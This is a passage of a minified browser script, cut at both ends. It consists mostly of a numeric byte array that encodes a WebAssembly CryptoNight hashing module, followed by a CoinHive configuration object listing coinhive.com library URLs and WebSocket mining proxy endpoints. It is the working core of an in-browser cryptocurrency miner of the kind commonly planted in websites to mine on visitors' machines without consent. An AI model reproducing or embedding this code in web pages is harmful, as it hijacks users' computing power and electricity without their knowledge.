88,193,88,238,193,119,175,48,159,117,159,69,117,175,66,231,165,99,165,132,99,66,32,112,80,48,80,64,48,32,229,203,46,26,46,209,26,229,253,239,18,14,18,225,14,253,191,8,183,109,183,101,109,191,129,85,212,76,212,25,76,129,24,36,60,20,60,48,20,24,38,121,95,53,95,76,53,38,195,178,113,47,113,157,47,195,190,134,56,225,56,103,225,190,53,200,253,162,253,106,162,53,136,199,79,204,79,11,204,136,46,101,75,57,75,92,57,46,147,106,249,87,249,61,87,147,85,88,13,242,13,170,242,85,252,97,157,130,157,227,130,252,122,179,201,71,201,244,71,122,200,39,239,172,239,139,172,200,186,136,50,231,50,111,231,186,50,79,125,43,125,100,43,50,230,66,164,149,164,215,149,230,192,59,251,160,251,155,160,192,25,170,179,152,179,50,152,25,158,246,104,209,104,39,209,158,163,34,129,127,129,93,127,163,68,238,170,102,170,136,102,68,84,214,130,126,130,168,126,84,59,221,230,171,230,118,171,59,11,149,158,131,158,22,131,11,140,201,69,202,69,3,202,140,199,188,123,41,123,149,41,199,107,5,110,211,110,214,211,107,40,108,68,60,68,80,60,40,167,44,139,121,139,85,121,167,188,129,61,226,61,99,226,188,22,49,39,29,39,44,29,22,173,55,154,118,154,65,118,173,219,150,77,59,77,173,59,219,100,158,250,86,250,200,86,100,116,166,210,78,210,232,78,116,20,54,34,30,34,40,30,20,146,228,118,219,118,63,219,146,12,18,30,10,30,24,10,12,72,252,180,108,180,144,108,72,184,143,55,228,55,107,228,184,159,120,231,93,231,37,93,159,189,15,178,110,178,97,110,189,67,105,42,239,42,134,239,67,196,53,241,166,241,147,166,196,57,218,227,168,227,114,168,57,49,198,247,164,247,98,164,49,211,138,89,55,89,189,55,211,242,116,134,139,134,255,139,242,213,131,86,50,86,177,50,213,139,78,197,67,197,13,67,139,110,133,235,89,235,220,89,110,218,24,194,183,194,175,183,218,1,142,143,140,143,2,140,1,177,29,172,100,172,121,100,177,156,241,109,210,109,35,210,156,73,114,59,224,59,146,224,73,216,31,199,180,199,171,180,216,172,185,21,250,21,67,250,172,243,250,9,7,9,253,7,243,207,160,111,37,111,133,37,207,202,32,234,175,234,143,175,202,244,125,137,142,137,243,142,244,71,103,32,233,32,142,233,71,16,56,40,24,40,32,24,16,111,11,100,213,100,222,213,111,240,115,131,136,131,251,136,240,74,251,177,111,177,148,111,74,92,202,150,114,150,184,114,92,56,84,108,36,108,112,36,56,87,95,8,241,8,174,241,87,115,33,82,199,82,230,199,115,151,100,243,81,243,53,81,151,203,174,101,35,101,141,35,203,161,37,132,124,132,89,124,161,232,87,191,156,191,203,156,232,62,93,99,33,99,124,33,62,150,234,124,221,124,55,221,150,97,30,127,220,127,194,220,97,13,156,145,134,145,26,134,13,15,155,148,133,148,30,133,15,224,75,171,144,171,219,144,224,124,186,198,66,198,248,66,124,113,38,87,196,87,226,196,113,204,41,229,170,229,131,170,204,144,227,115,216,115,59,216,144,6,9,15,5,15,12,5,6,247,244,3,1,3,245,1,247,28,42,54,18,54,56,18,28,194,60,254,163,254,159,163,194,106,139,225,95,225,212,95,106,174,190,16,249,16,71,249,174,105,2,107,208,107,210,208,105,23,191,168,145,168,46,145,23,153,113,232,88,232,41,88,153,58,83,105,39,105,116,39,58,39,247,208,185,208,78,185,39,217,145,72,56,72,169,56,217,235,222,53,19,53,205,19,235,43,229,206,179,206,86,179,43,34,119,85,51,85,68,51,34,210,4,214,187,214,191,187,210,169,57,144,112,144,73,112,169,7,135,128,137,128,14,137,7,51,193,242,167,242,102,167,51,45,236,193,182,193,90,182,45,60,90,102,34,102,120,34,60,21,184,173,146,173,42,146,21,201,169,96,32,96,137,32,201,135,92,219,73,219,21,73,135,170,176,26,255,26,79,255,170,80,216,136,120,136,160,120,80,165,43,142,122,142,81,122,165,3,137,138,143,138,6,143,3,89,74,19,248,19,178,248,89,9,146,155,128,155,18,128,9,26,35,57,23,57,52,23,26,101,16,117,218,117,202,218,101,215,132,83,49,83,181,49,215,132,213,81,198,81,19,198,132,208,3,211,184,211,187,184,208,130,220,94,195,94,31,195,130,41,226,203,176,203,82,176,41,90,195,153,119,153,180,119,90,30,45,51,17,51,60,17,30,123,61,70,203,70,246,203,123,168,183,31,252,31,75,252,168,109,12,97,214,97,218,214,109,44,98,78,58,78,88,58,44,1,0,0,0,3,0,0,0,6,0,0,0,10,0,0,0,15,0,0,0,21,0,0,0,28,0,0,0,36,0,0,0,45,0,0,0,55,0,0,0,2,0,0,0,14,0,0,0,27,0,0,0,41,0,0,0,56,0,0,0,8,0,0,0,25,0,0,0,43,0,0,0,62,0,0,0,18,0,0,0,39,0,0,0,61,0,0,0,20,0,0,0,44,0,0,0,10,0,0,0,7,0,0,0,11,0,0,0,17,0,0,0,18,0,0,0,3,0,0,0,5,0,0,0,16,0,0,0,8,0,0,0,21,0,0,0,24,0,0,0,4,0,0,0,15,0,0,0,23,0,0,0,19,0,0,0,13,0,0,0,12,0,0,0,2,0,0,0,20,0,0,0,14,0,0,0,22,0,0,0,9,0,0,0,6,0,0,0,1,0,0,0,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,14,10,4,8,9,15,13,6,1,12,0,2,11,7,5,3,11,8,12,0,5,2,15,13,10,14,3,6,7,1,9,4,7,9,3,1,13,12,11,14,2,6,5,10,4,0,15,8,9,0,5,7,2,4,10,15,14,1,11,12,6,8,3,13,2,12,6,10,0,11,8,3,4,13,7,5,15,14,1,9,12,5,1,15,14,13,4,10,0,7,6,3,9,2,8,11,13,11,7,14,12,1,3,9,5,0,15,4,8,6,2,10,6,15,14,9,11,3,0,8,12,2,13,7,1,4,10,5,10,2,8,4,7,6,1,5,15,11,9,14,3,12,13,0,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,14,10,4,8,9,15,13,6,1,12,0,2,11,7,5,3,11,8,12,0,5,2,15,13,10,14,3,6,7,1,9,4,7,9,3,1,13,12,11,14,2,6,5,10,4,0,15,8,128,0,65,176,62,11,202,13,235,152,163,65,44,32,211,235,146,205,190,123,156,178,69,193,28,147,81,145,96,212,199,250,38,0,130,214,126,80,138,3,164,35,158,38,119,38,185,69,224,251,26,72,212,26,148,119,205,181,171,38,2,107,23,122,86,240,36,66,15,255,47,168,113,163,150,137,127,46,77,117,29,20,73,8,247,125,226,98,39,118,149,247,118,36,143,148,135,213,182,87,71,128,41,108,92,94,39,45,172,142,13,108,81,132,80,198,87,5,122,15,123,228,211,103,112,36,18,234,137,227,171,19,211,28,215,105,114,213,222,162,223,21,248,103,123,132,21,10,183,35,21,87,129,171,214,144,77,90,135,246,78,159,79,197,195,209,43,64,234,152,58,224,92,69,250,156,3,197,210,153,102,178,153,154,102,2,150,180,242,187,83,138,181,86,20,26,136,219,162,49,3,163,90,92,154,25,14,219,64,63,178,10,135,193,68,16,28,5,25,128,132,158,149,29,111,51,235,173,94,231,205,220,16,186,19,146,2,191,107,65,220,120,101,21,247,187,39,208,10,44,129,57,55,170,120,80,63,26,191,210,65,0,145,211,66,45,90,13,246,204,126,144,221,98,159,156,146,192,151,206,24,92,167,11,199,43,68,172,209,223,101,214,99,198,252,35,151,110,108,3,158,224,184,26,33,5,69,126,68,108,236,168,238,241,3,187,93,142,97,250,253,150,151,178,148,131,129,151,74,142,133,55,219,3,48,47,42,103,141,45,251,159,106,149,138,254,115,129,248,184,105,108,138,199,114,70,192,127,66,20,197,244,21,143,189,199,94,196,117,68,111,167,143,17,187,128,82,222,117,183,174,228,136,188,130,184,0,30,152,166,163,244,142,244,143,51,169,163,99,21,170,95,86,36,213,183,249,137,182,241,237,32,124,90,224,253,54,202,233,90,6,66,44,54,206,41,53,67,78,254,152,61,83,58,249,116,115,154,75,167,208,245,31,89,111,78,129,134,14,157,173,129,175,216,90,159,167,5,6,103,238,52,98,106,139,11,40,190,110,185,23,39,71,116,7,38,198,128,16,63,224,160,126,111,198,126,72,123,13,85,10,165,74,248,164,192,145,227,231,159,151,142,241,158,134,118,114,129,80,96,141,212,126,158,90,65,243,229,176,98,252,159,31,236,64,84,32,122,227,228,26,0,206,244,201,132,79,215,148,245,157,250,149,216,85,46,126,17,36,195,84,165,91,223,114,40,189,254,110,40,120,245,127,226,15,165,196,178,5,137,124,239,238,73,211,46,68,126,147,133,235,40,89,127,112,95,105,55,179,36,49,74,94,134,40,241,29,214,228,101,199,27,119,4,81,185,32,231,116,254,67,232,35,212,135,138,125,41,232,163,146,118,148,242,221,203,122,9,155,48,217,193,29,27,48,251,91,220,27,224,218,36,73,79,242,156,130,191,164,231,186,49,180,112,191,255,13,50,68,5,222,248,188,72,59,174,252,50,83,187,211,57,69,159,195,193,224,41,139,160,229,201,5,253,247,174,9,15,148,112,52,18,66,144,241,52,162,113,183,1,227,68,237,149,233,59,142,54,79,47,152,74,136,64,29,99,160,108,246,21,71,193,68,75,135,82,175,255,126,187,74,241,226,10,198,48,70,112,182,197,204,110,140,230,164,213,164,86,189,79,202,0,218,157,132,75,200,62,24,174,115,87,206,69,48,100,209,173,232,166,206,104,20,92,37,103,163,218,140,242,203,14,225,22,51,233,6,88,154,148,153,154,31,96,178,32,194,111,132,123,209,206,172,127,160,209,133,24,50,89,91,161,141,221,25,211,80,154,28,192,170,165,180,70,159,61,99,103,228,4,107,186,246,202,25,171,11,86,238,126,31,177,121,234,169,40,33,116,233,189,247,53,59,54,81,238,29,87,172,90,117,80,211,118,58,70,194,254,163,125,112,1,247,53,193,175,152,164,216,66,120,237,236,32,158,107,103,121,65,131,99,21,234,58,219,168,250,195,59,77,50,131,44,131,167,64,59,31,28,39,71,243,89,64,240,52,183,45,118,154,231,62,78,108,210,33,79,253,184,253,141,57,220,87,89,239,141,155,12,73,43,73,235,218,91,162,215,73,104,243,112,13,125,59,174,208,122,141,85,132,245,165,233,240,228,248,142,101,160,184,162,244,54,16,59,83,12,168,7,158,117,62,236,90,145,104,148,146,86,232,136,79,91,176,92,85,248,186,188,76,227,187,59,153,243,135,148,123,117,218,244,214,114,107,28,93,100,174,172,40,220,52,179,109,108,52,165,80,184,40,219,113,248,97,226,242,16,141,81,42,227,219,100,51,89,221,117,252,28,172,188,241,67,206,63,162,103,187,209,60,2,232,67,176,51,10,91,202,136,41,161,117,127,52,25,77,180,22,83,92,146,59,148,195,14,121,77,30,121,116,117,215,182,238,175,63,234,168,212,247,190,26,57,33,92,244,126,9,76,35,39,81,38,163,36,83,186,50,60,210,68,163,23,74,109,166,213,173,181,29,62,166,175,242,201,8,131,89,61,152,145,107,60,86,76,248,124,161,114,134,96,77,70,226,62,204,8,110,199,246,47,152,51,179,177,188,118,94,43,214,102,165,239,196,230,42,6,244,182,232,190,193,212,54,116,238,130,21,188,239,33,99,253,193,78,13,244,83,201,105,167,125,90,196,6,88,88,38,126,193,20,22,6,224,250,22,126,144,175,61,40,99,157,63,210,201,242,227,0,155,210,12,95,170,206,48,183,212,12,48,116,42,81,22,242,224,50,152,13,235,48,216,227,206,248,154,75,197,158,123,181,241,121,146,255,81,230,110,4,134,104,211,155,35,77,87,230,150,103,49,204,230,166,243,23,10,117,5,177,118,129,217,19,50,108,206,60,23,82,132,248,5,162,98,244,43,203,179,120,71,21,71,255,70,84,130,35,147,106,72,56,223,88,7,78,94,101,101,242,252,124,137,252,134,80,142,49,112,46,68,208,11,202,134,240,64,9,162,48,120,71,78,101,160,238,57,209,247,56,131,247,94,233,55,228,44,58,189,33,151,178,38,1,19,248,111,163,68,237,209,239,159,222,231,139,160,223,21,118,37,146,217,60,133,247,246,18,220,66,190,216,167,236,124,171,39,176,126,83,141,125,218,170,62,168,222,170,37,206,147,189,2,105,216,90,246,67,253,26,115,8,249,192,95,239,218,23,74,25,165,151,77,102,51,76,253,33,106,53,180,152,49,219,65,21,112,234,30,15,187,237,205,84,155,154,208,99,161,81,151,64,114,246,117,157,191,145,71,111,226,99,124,119,123,242,107,111,197,48,1,103,43,254,215,171,118,202,130,201,125,250,89,71,240,173,212,162,175,156,164,114,192,183,253,147,38,54,63,247,204,52,165,229,241,113,216,49,21,4,199,35,195,24,150,5,154,7,18,128,226,235,39,178,117,9,131,44,26,27,110,90,160,82,59,214,179,41,227,47,132,83,209,0,237,32,252,177,91,106,203,190,57,74,76,88,207,208,239,170,251,67,77,51,133,69,249,2,127,80,60,159,168,81,163,64,143,146,157,56,245,188,182,218,33,16,255,243,210,205,12,19,236,95,151,68,23,196,167,126,61,100,93,25,115,96,129,79,220,34,42,144,136,70,238,184,20,222,94,11,219,224,50,58,10,73,6,36,92,194,211,172,98,145,149,228,121,231,200,55,109,141,213,78,169,108,86,244,234,101,122,174,8,186,120,37,46,28,166,180,198,232,221,116,31,75,189,139,138,112,62,181,102,72,3,246,14,97,53,87,185,134,193,29,158,225,248,152,17,105,217,142,148,155,30,135,233,206,85,40,223,140,161,137,13,191,230,66,104,65,153,45,15,176,84,187,22,1,2,4,8,16,32,64,128,27,54,0,137,31,4,110,97,109,101,1,192,3,39,0,9,101,110,118,46,97,98,111,114,116,1,17,101,110,118,46,101,110,108,97,114,103,101,77,101,109,111,114,121,2,18,101,110,118,46,103,101,116,84,111,116,97,108,77,101,109,111,114,121,3,27,101,110,118,46,97,98,111,114,116,79,110,67,97,110,110,111,116,71,114,111,119,77,101,109,111,114,121,4,15,101,110,118,46,95,95,95,115,101,116,69,114,114,78,111,5,16,101,110,118,46,95,95,95,115,121,115,99,97,108,108,50,48,6,26,101,110,118,46,95,101,109,115,99,114,105,112,116,101,110,95,109,101,109,99,112,121,95,98,105,103,7,10,101,110,118,46,95,102,116,105,109,101,8,11,101,110,118,46,95,103,109,116,105,109,101,9,2,102,57,10,3,102,49,48,11,3,102,49,49,12,3,102,49,50,13,3,102,49,51,14,3,102,49,52,15,3,102,49,53,16,7,95,109,97,108,108,111,99,17,3,102,49,55,18,3,102,49,56,19,3,102,49,57,20,18,95,97,101,115,98,95,115,105,110,103,108,101,95,114,111,117,110,100,21,3,102,50,49,22,3,102,50,50,23,3,102,50,51,24,3,102,50,52,25,3,102,50,53,26,3,102,50,54,27,3,102,50,55,28,20,95,99,114,121,112,116,111,110,105,103,104,116,95,100,101,115,116,114,111,121,29,19,95,99,114,121,112,116,111,110,105,103,104,116,95,99,114,101,97,116,101,30,3,102,51,48,31,3,102,51,49,32,3,102,51,50,33,3,102,51,51,34,3,102,51,52,35,27,95,99,114,121,112,116,111,110,105,103,104,116,95,104,97,115,104,95,118,97,114,105,97,110,116,95,50,36,27,95,99,114,121,112,116,111,110,105,103,104,116,95,104,97,115,104,95,118,97,114,105,97,110,116,95,49,37,27,95,99,114,121,112,116,111,110,105,103,104,116,95,104,97,115,104,95,118,97,114,105,97,110,116,95,48,38,10,115,116,97,99,107,65,108,108,111,99,2,190,27,39,0,1,0,0,1,0,2,0,3,0,4,1,0,0,5,2,0,0,1,0,6,3,0,0,1,0,2,0,7,1,0,0,8,1,0,0,9,12,0,2,112,48,1,2,112,49,2,2,108,48,3,2,108,49,4,2,108,50,5,2,108,51,6,2,108,52,7,2,108,53,8,2,108,54,9,2,108,55,10,2,108,56,11,2,108,57,10,24,0,2,112,48,1,2,112,49,2,2,112,50,3,2,108,48,4,2,108,49,5,2,108,50,6,2,108,51,7,2,108,52,8,2,108,53,9,2,108,54,10,2,108,55,11,2,108,56,12,2,108,57,13,3,108,49,48,14,3,108,49,49,15,3,108,49,50,16,3,108,49,51,17,3,108,49,52,18,3,108,49,53,19,3,108,49,54,20,3,108,49,55,21,3,108,49,56,22,3,108,49,57,23,3,108,50,48,11,6,0,2,112,48,1,2,112,49,2,2,112,50,3,2,108,48,4,2,108,49,5,2,108,50,12,9,0,2,112,48,1,2,108,48,2,2,108,49,3,2,108,50,4,2,108,51,5,2,108,52,6,2,108,53,7,2,108,54,8,2,108,55,13,30,0,2,112,48,1,2,112,49,2,2,112,50,3,2,108,48,4,2,108,49,5,2,108,50,6,2,108,51,7,2,108,52,8,2,108,53,9,2,108,54,10,2,108,55,11,2,108,56,12,2,108,57,13,3,108,49,48,14,3,108,49,49,15,3,108,49,50,16,3,108,49,51,17,3,108,49,52,18,3,108,49,53,19,3,108,49,54,20,3,108,49,55,21,3,108,49,56,22,3,108,49,57,23,3,108,50,48,24,3,108,50,49,25,3,108,50,50,26,3,108,50,51,27,3,108,50,52,28,3,108,50,53,29,3,108,50,54,14,7,0,2,112,48,1,2,112,49,2,2,112,50,3,2,108,48,4,2,108,49,5,2,108,50,6,2,108,51,15,3,0,2,112,48,1,2,108,48,2,2,108,49,16,13,0,2,112,48,1,2,108,48,2,2,108,49,3,2,108,50,4,2,108,51,5,2,108,52,6,2,108,53,7,2,108,54,8,2,108,55,9,2,108,56,10,2,108,57,11,3,108,49,48,12,3,108,49,49,17,8,0,2,112,48,1,2,112,49,2,2,112,50,3,2,108,48,4,2,108,49,5,2,108,50,6,2,108,51,7,2,108,52,18,17,0,2,112,48,1,2,112,49,2,2,108,48,3,2,108,49,4,2,108,50,5,2,108,51,6,2,108,52,7,2,108,53,8,2,108,54,9,2,108,55,10,2,108,56,11,2,108,57,12,3,108,49,48,13,3,108,49,49,14,3,108,49,50,15,3,108,49,51,16,3,108,49,52,19,55,0,2,112,48,1,2,108,48,2,2,108,49,3,2,108,50,4,2,108,51,5,2,108,52,6,2,108,53,7,2,108,54,8,2,108,55,9,2,108,56,10,2,108,57,11,3,108,49,48,12,3,108,49,49,13,3,108,49,50,14,3,108,49,51,15,3,108,49,52,16,3,108,49,53,17,3,108,49,54,18,3,108,49,55,19,3,108,49,56,20,3,108,49,57,21,3,108,50,48,22,3,108,50,49,23,3,108,50,50,24,3,108,50,51,25,3,108,50,52,26,3,108,50,53,27,3,108,50,54,28,3,108,50,55,29,3,108,50,56,30,3,108,50,57,31,3,108,51,48,32,3,108,51,49,33,3,108,51,50,34,3,108,51,51,35,3,108,51,52,36,3,108,51,53,37,3,108,51,54,38,3,108,51,55,39,3,108,51,56,40,3,108,51,57,41,3,108,52,48,42,3,108,52,49,43,3,108,52,50,44,3,108,52,51,45,3,108,52,52,46,3,108,52,53,47,3,108,52,54,48,3,108,52,55,49,3,108,52,56,50,3,108,52,57,51,3,108,53,48,52,3,108,53,49,53,3,108,53,50,54,3,108,53,51,20,7,0,2,112,48,1,2,112,49,2,2,112,50,3,2,108,48,4,2,108,49,5,2,108,50,6,2,108,51,21,3,0,2,112,48,1,2,112,49,2,2,112,50,22,65,0,2,112,48,1,2,108,48,2,2,108,49,3,2,108,50,4,2,108,51,5,2,108,52,6,2,108,53,7,2,108,54,8,2,108,55,9,2,108,56,10,2,108,57,11,3,108,49,48,12,3,108,49,49,13,3,108,49,50,14,3,108,49,51,15,3,108,49,52,16,3,108,49,53,17,3,108,49,54,18,3,108,49,55,19,3,108,49,56,20,3,108,49,57,21,3,108,50,48,22,3,108,50,49,23,3,108,50,50,24,3,108,50,51,25,3,108,50,52,26,3,108,50,53,27,3,108,50,54,28,3,108,50,55,29,3,108,50,56,30,3,108,50,57,31,3,108,51,48,32,3,108,51,49,33,3,108,51,50,34,3,108,51,51,35,3,108,51,52,36,3,108,51,53,37,3,108,51,54,38,3,108,51,55,39,3,108,51,56,40,3,108,51,57,41,3,108,52,48,42,3,108,52,49,43,3,108,52,50,44,3,108,52,51,45,3,108,52,52,46,3,108,52,53,47,3,108,52,54,48,3,108,52,55,49,3,108,52,56,50,3,108,52,57,51,3,108,53,48,52,3,108,53,49,53,3,108,53,50,54,3,108,53,51,55,3,108,53,52,56,3,108,53,53,57,3,108,53,54,58,3,108,53,55,59,3,108,53,56,60,3,108,53,57,61,3,108,54,48,62,3,108,54,49,63,3,108,54,50,64,3,108,54,51,23,55,0,2,112,48,1,2,112,49,2,2,112,50,3,2,112,51,4,2,108,48,5,2,108,49,6,2,108,50,7,2,108,51,8,2,108,52,9,2,108,53,10,2,108,54,11,2,108,55,12,2,108,56,13,2,108,57,14,3,108,49,48,15,3,108,49,49,16,3,108,49,50,17,3,108,49,51,18,3,108,49,52,19,3,108,49,53,20,3,108,49,54,21,3,108,49,55,22,3,108,49,56,23,3,108,49,57,24,3,108,50,48,25,3,108,50,49,26,3,108,50,50,27,3,108,50,51,28,3,108,50,52,29,3,108,50,53,30,3,108,50,54,31,3,108,50,55,32,3,108,50,56,33,3,108,50,57,34,3,108,51,48,35,3,108,51,49,36,3,108,51,50,37,3,108,51,51,38,3,108,51,52,39,3,108,51,53,40,3,108,51,54,41,3,108,51,55,42,3,108,51,56,43,3,108,51,57,44,3,108,52,48,45,3,108,52,49,46,3,108,52,50,47,3,108,52,51,48,3,108,52,52,49,3,108,52,53,50,3,108,52,54,51,3,108,52,55,52,3,108,52,56,53,3,108,52,57,54,3,108,53,48,24,70,0,2,112,48,1,2,112,49,2,2,112,50,3,2,108,48,4,2,108,49,5,2,108,50,6,2,108,51,7,2,108,52,8,2,108,53,9,2,108,54,10,2,108,55,11,2,108,56,12,2,108,57,13,3,108,49,48,14,3,108,49,49,15,3,108,49,50,16,3,108,49,51,17,3,108,49,52,18,3,108,49,53,19,3,108,49,54,20,3,108,49,55,21,3,108,49,56,22,3,108,49,57,23,3,108,50,48,24,3,108,50,49,25,3,108,50,50,26,3,108,50,51,27,3,108,50,52,28,3,108,50,53,29,3,108,50,54,30,3,108,50,55,31,3,108,50,56,32,3,108,50,57,33,3,108,51,48,34,3,108,51,49,35,3,108,51,50,36,3,108,51,51,37,3,108,51,52,38,3,108,51,53,39,3,108,51,54,40,3,108,51,55,41,3,108,51,56,42,3,108,51,57,43,3,108,52,48,44,3,108,52,49,45,3,108,52,50,46,3,108,52,51,47,3,108,52,52,48,3,108,52,53,49,3,108,52,54,50,3,108,52,55,51,3,108,52,56,52,3,108,52,57,53,3,108,53,48,54,3,108,53,49,55,3,108,53,50,56,3,108,53,51,57,3,108,53,52,58,3,108,53,53,59,3,108,53,54,60,3,108,53,55,61,3,108,53,56,62,3,108,53,57,63,3,108,54,48,64,3,108,54,49,65,3,108,54,50,66,3,108,54,51,67,3,108,54,52,68,3,108,54,53,69,3,108,54,54,25,36,0,2,112,48,1,2,112,49,2,2,112,50,3,2,112,51,4,2,108,48,5,2,108,49,6,2,108,50,7,2,108,51,8,2,108,52,9,2,108,53,10,2,108,54,11,2,108,55,12,2,108,56,13,2,108,57,14,3,108,49,48,15,3,108,49,49,16,3,108,49,50,17,3,108,49,51,18,3,108,49,52,19,3,108,49,53,20,3,108,49,54,21,3,108,49,55,22,3,108,49,56,23,3,108,49,57,24,3,108,50,48,25,3,108,50,49,26,3,108,50,50,27,3,108,50,51,28,3,108,50,52,29,3,108,50,53,30,3,108,50,54,31,3,108,50,55,32,3,108,50,56,33,3,108,50,57,34,3,108,51,48,35,3,108,51,49,26,108,0,2,112,48,1,2,112,49,2,2,112,50,3,2,112,51,4,2,108,48,5,2,108,49,6,2,108,50,7,2,108,51,8,2,108,52,9,2,108,53,10,2,108,54,11,2,108,55,12,2,108,56,13,2,108,57,14,3,108,49,48,15,3,108,49,49,16,3,108,49,50,17,3,108,49,51,18,3,108,49,52,19,3,108,49,53,20,3,108,49,54,21,3,108,49,55,22,3,108,49,56,23,3,108,49,57,24,3,108,50,48,25,3,108,50,49,26,3,108,50,50,27,3,108,50,51,28,3,108,50,52,29,3,108,50,53,30,3,108,50,54,31,3,108,50,55,32,3,108,50,56,33,3,108,50,57,34,3,108,51,48,35,3,108,51,49,36,3,108,51,50,37,3,108,51,51,38,3,108,51,52,39,3,108,51,53,40,3,108,51,54,41,3,108,51,55,42,3,108,51,56,43,3,108,51,57,44,3,108,52,48,45,3,108,52,49,46,3,108,52,50,47,3,108,52,51,48,3,108,52,52,49,3,108,52,53,50,3,108,52,54,51,3,108,52,55,52,3,108,52,56,53,3,108,52,57,54,3,108,53,48,55,3,108,53,49,56,3,108,53,50,57,3,108,53,51,58,3,108,53,52,59,3,108,53,53,60,3,108,53,54,61,3,108,53,55,62,3,108,53,56,63,3,108,53,57,64,3,108,54,48,65,3,108,54,49,66,3,108,54,50,67,3,108,54,51,68,3,108,54,52,69,3,108,54,53,70,3,108,54,54,71,3,108,54,55,72,3,108,54,56,73,3,108,54,57,74,3,108,55,48,75,3,108,55,49,76,3,108,55,50,77,3,108,55,51,78,3,108,55,52,79,3,108,55,53,80,3,108,55,54,81,3,108,55,55,82,3,108,55,56,83,3,108,55,57,84,3,108,56,48,85,3,108,56,49,86,3,108,56,50,87,3,108,56,51,88,3,108,56,52,89,3,108,56,53,90,3,108,56,54,91,3,108,56,55,92,3,108,56,56,93,3,108,56,57,94,3,108,57,48,95,3,108,57,49,96,3,108,57,50,97,3,108,57,51,98,3,108,57,52,99,3,108,57,53,100,3,108,57,54,101,3,108,57,55,102,3,108,57,56,103,3,108,57,57,104,4,108,49,48,48,105,4,108,49,48,49,106,4,108,49,48,50,107,4,108,49,48,51,27,36,0,2,112,48,1,2,112,49,2,2,108,48,3,2,108,49,4,2,108,50,5,2,108,51,6,2,108,52,7,2,108,53,8,2,108,54,9,2,108,55,10,2,108,56,11,2,108,57,12,3,108,49,48,13,3,108,49,49,14,3,108,49,50,15,3,108,49,51,16,3,108,49,52,17,3,108,49,53,18,3,108,49,54,19,3,108,49,55,20,3,108,49,56,21,3,108,49,57,22,3,108,50,48,23,3,108,50,49,24,3,108,50,50,25,3,108,50,51,26,3,108,50,52,27,3,108,50,53,28,3,108,50,54,29,3,108,50,55,30,3,108,50,56,31,3,108,50,57,32,3,108,51,48,33,3,108,51,49,34,3,108,51,50,35,3,108,51,51,28,5,0,2,112,48,1,2,108,48,2,2,108,49,3,2,108,50,4,2,108,51,29,15,0,2,108,48,1,2,108,49,2,2,108,50,3,2,108,51,4,2,108,52,5,2,108,53,6,2,108,54,7,2,108,55,8,2,108,56,9,2,108,57,10,3,108,49,48,11,3,108,49,49,12,3,108,49,50,13,3,108,49,51,14,3,108,49,52,30,12,0,2,112,48,1,2,112,49,2,2,112,50,3,2,108,48,4,2,108,49,5,2,108,50,6,2,108,51,7,2,108,52,8,2,108,53,9,2,108,54,10,2,108,55,11,2,108,56,31,4,0,2,112,48,1,2,112,49,2,2,112,50,3,2,108,48,32,14,0,2,112,48,1,2,112,49,2,2,112,50,3,2,108,48,4,2,108,49,5,2,108,50,6,2,108,51,7,2,108,52,8,2,108,53,9,2,108,54,10,2,108,55,11,2,108,56,12,2,108,57,13,3,108,49,48,33,9,0,2,112,48,1,2,112,49,2,2,112,50,3,2,108,48,4,2,108,49,5,2,108,50,6,2,108,51,7,2,108,52,8,2,108,53,34,17,0,2,112,48,1,2,112,49,2,2,112,50,3,2,108,48,4,2,108,49,5,2,108,50,6,2,108,51,7,2,108,52,8,2,108,53,9,2,108,54,10,2,108,55,11,2,108,56,12,2,108,57,13,3,108,49,48,14,3,108,49,49,15,3,108,49,50,16,3,108,49,51,35,41,0,2,112,48,1,2,112,49,2,2,112,50,3,2,112,51,4,2,108,48,5,2,108,49,6,2,108,50,7,2,108,51,8,2,108,52,9,2,108,53,10,2,108,54,11,2,108,55,12,2,108,56,13,2,108,57,14,3,108,49,48,15,3,108,49,49,16,3,108,49,50,17,3,108,49,51,18,3,108,49,52,19,3,108,49,53,20,3,108,49,54,21,3,108,49,55,22,3,108,49,56,23,3,108,49,57,24,3,108,50,48,25,3,108,50,49,26,3,108,50,50,27,3,108,50,51,28,3,108,50,52,29,3,108,50,53,30,3,108,50,54,31,3,108,50,55,32,3,108,50,56,33,3,108,50,57,34,3,108,51,48,35,3,108,51,49,36,3,108,51,50,37,3,108,51,51,38,3,108,51,52,39,3,108,51,53,40,3,108,51,54,36,31,0,2,112,48,1,2,112,49,2,2,112,50,3,2,112,51,4,2,108,48,5,2,108,49,6,2,108,50,7,2,108,51,8,2,108,52,9,2,108,53,10,2,108,54,11,2,108,55,12,2,108,56,13,2,108,57,14,3,108,49,48,15,3,108,49,49,16,3,108,49,50,17,3,108,49,51,18,3,108,49,52,19,3,108,49,53,20,3,108,49,54,21,3,108,49,55,22,3,108,49,56,23,3,108,49,57,24,3,108,50,48,25,3,108,50,49,26,3,108,50,50,27,3,108,50,51,28,3,108,50,52,29,3,108,50,53,30,3,108,50,54,37,30,0,2,112,48,1,2,112,49,2,2,112,50,3,2,112,51,4,2,108,48,5,2,108,49,6,2,108,50,7,2,108,51,8,2,108,52,9,2,108,53,10,2,108,54,11,2,108,55,12,2,108,56,13,2,108,57,14,3,108,49,48,15,3,108,49,49,16,3,108,49,50,17,3,108,49,51,18,3,108,49,52,19,3,108,49,53,20,3,108,49,54,21,3,108,49,55,22,3,108,49,56,23,3,108,49,57,24,3,108,50,48,25,3,108,50,49,26,3,108,50,50,27,3,108,50,51,28,3,108,50,52,29,3,108,50,53,38,2,0,2,112,48,1,2,108,48] ; var Module=typeof Module!==\"undefined\"?Module:{};self.CoinHive=self.CoinHive||{};self.CoinHive.CONFIG={LIB_URL:\"https:\/\/coinhive.com\/lib\/\",ASMJS_NAME:\"worker-asmjs.min.js?v8\",REQUIRES_AUTH:false,WEBSOCKET_SHARDS:[[\"wss:\/\/ws001.coinhive.com\/proxy\",\"wss:\/\/ws002.coinhive.com\/proxy\",\"wss:\/\/ws003.coinhive.com\/proxy\",\"wss:\/\/ws004.coinhive.com\/proxy\",\"wss:\/\/ws005.coinhive.com\/proxy\",\"wss:\/\/ws006.coinhive.com\/proxy\",\"wss:\/\/ws007.coinhive.com\/proxy\",\"wss:\/\/ws008.coinhive.com\/proxy\"],[\"wss:\/\/ws009.coinhive.com\/proxy\",\"wss:\/\/ws010.coinhive.com\/proxy\",\"wss:\/\/ws011.coinhive.com\/proxy\",\"wss:\/\/ws012.coinhive.com\/proxy\",\"wss:\/\/ws013.coinhive.com\/proxy\",\"wss:\/\/ws014.coinhive.com\/proxy\",\"wss:\/\/ws015.coinhive.com\/proxy\",\"wss:\/\/ws016.coinhive.com\/p